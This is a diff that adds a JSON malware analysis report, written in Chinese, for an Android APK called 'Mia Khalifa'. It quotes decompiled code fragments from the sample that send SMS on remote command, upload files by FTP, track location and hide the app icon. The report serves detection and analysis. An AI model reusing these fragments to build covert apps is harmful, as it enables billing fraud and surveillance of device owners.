@@ -1,0 +1,132 @@
+{
+  "APK信息": {
+    "文件名": "d3251de14d0ae11ee7e6f3d02ded2c2d7c64ef214937cb6bcc599a9f09e911ed.apk",
+    "sha256": "d3251de14d0ae11ee7e6f3d02ded2c2d7c64ef214937cb6bcc599a9f09e911ed",
+    "包名": "com.appolonis.MiaKhalifa",
+    "应用名": "Mia Khalifa",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 169.1
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\appolonis\\MiaKhalifa\\Alarm;",
+          "method_signature": "if(cm.startsWith(\"sms\")",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (cm.startsWith(\"sms\")) {\n    String[] cp = cm.substring(4, cm.length()).split(\"-\");\n    SmsManager sms = SmsManager.getDefault();\n    sms.sendTextMessage(cp[0], null, cp[1], null, null);\n}",
+          "malicious_code_snippet_context": "                  new Ftpuploaddir().executeOnExecutor(AsyncTask.SERIAL_EXECUTOR, String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + File.separator + cm2, cm2, name);\n                  return;\n              }\n>>>             if (cm.startsWith(\"sms\")) {\n>>>                 new Ftprename().execute(name, \"\");\n>>>                 String[] cp = cm.substring(4, cm.length()).split(\"-\");\n>>>                 SmsManager sms = SmsManager.getDefault();\n>>>                 sms.sendTextMessage(cp[0], null, cp[1], null, null);\n                  return;\n              }\n              if (cm.equals(\"getcontacts\")) {",
+          "behavior_description": "代码从远程FTP服务器接收控制命令字符串cm，当命令以\"sms\"开头时，解析出目标手机号cp[0]和短信内容cp[1]，然后调用SmsManager.sendTextMessage()在后台静默发送短信。攻击者可远程指定任意号码和内容发送短信，可能导致用户被扣费、发送欺诈短信或进行短信钓鱼攻击。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates",
+          "LocationManager"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\appolonis\\MiaKhalifa\\MyLocationListner;",
+          "method_signature": "if(this.locationManager != null)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.locationManager = (LocationManager) this.mContext.getSystemService(\"location\");\nthis.isGPSEnabled = this.locationManager.isProviderEnabled(\"gps\");\nthis.isNetworkEnabled = this.locationManager.isProviderEnabled(\"network\");\nif (this.isNetworkEnabled) {\n    this.locationManager.requestLocationUpdates(\"network\", MIN_TIME_BW_UPDATES, 10.0f, this);\n    this.location = this.locationManager.getLastKnownLocation(\"network\");\n    if (this.location != null) {\n        this.latitude = this.location.getLatitude();\n        this.longitude = this.location.getLongitude();\n    }\n}\nif (this.isGPSEnabled && this.location == null) {\n    this.locationManager.requestLocationUpdates(\"gps\", MIN_TIME_BW_UPDATES, 10.0f, this);",
+          "malicious_code_snippet_context": "  \n      public Location getLocation() {\n          try {\n>>>             this.locationManager = (LocationManager) this.mContext.getSystemService(\"location\");\n>>>             this.isGPSEnabled = this.locationManager.isProviderEnabled(\"gps\");\n>>>             this.isNetworkEnabled = this.locationManager.isProviderEnabled(\"network\");\n>>>             if (this.isGPSEnabled || this.isNetworkEnabled) {\n>>>                 this.canGetLocation = true;\n>>>                 if (this.isNetworkEnabled) {\n>>>                     this.locationManager.requestLocationUpdates(\"network\", MIN_TIME_BW_UPDATES, 10.0f, this);\n>>>                     Log.d(\"Network\", \"Network\");\n>>>                     if (this.locationManager != null) {\n>>>                         this.location = this.locationManager.getLastKnownLocation(\"network\");\n>>>                         if (this.location != null) {\n>>>                             this.latitude = this.location.getLatitude();\n>>>                             this.longitude = this.location.getLongitude();\n                          }\n                      }\n                  }",
+          "behavior_description": "代码通过LocationManager获取系统位置服务，检查GPS和网络定位状态，优先通过网络定位获取用户最后已知位置，提取经纬度存储到类成员变量中；若网络定位不可用则回退到GPS定位。在已确认的恶意样本中，该位置数据通常会被上传至C2服务器用于用户追踪。数据流向：LocationManager.getLastKnownLocation() → getLatitude()/getLongitude() 存储至成员变量待后续窃取",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\appolonis\\MiaKhalifa\\Firsttime;",
+          "method_signature": "if(!this.debug)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (!this.debug) {\n    PackageManager p = getPackageManager();\n    ComponentName componentName = new ComponentName(this, (Class<?>) Firsttime.class);\n    p.setComponentEnabledSetting(componentName, 2, 1);\n}",
+          "malicious_code_snippet_context": "      }\n  \n      public void dostuff() {\n>>>         if (!this.debug) {\n>>>             PackageManager p = getPackageManager();\n>>>             ComponentName componentName = new ComponentName(this, (Class<?>) Firsttime.class);\n>>>             p.setComponentEnabledSetting(componentName, 2, 1);\n>>>         }\n          getinstalledapps();\n          this.prefs = getSharedPreferences(\"myPrefsKey\", 0);\n          this.editor = this.prefs.edit();",
+          "behavior_description": "代码在非调试模式下，通过 PackageManager.setComponentEnabledSetting() 将主入口组件 Firsttime 的状态设置为 COMPONENT_ENABLED_STATE_DISABLED (常量值2)，从而在用户启动应用后隐藏应用图标，使其在桌面消失，增加用户卸载难度并为后续恶意行为提供隐蔽环境。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
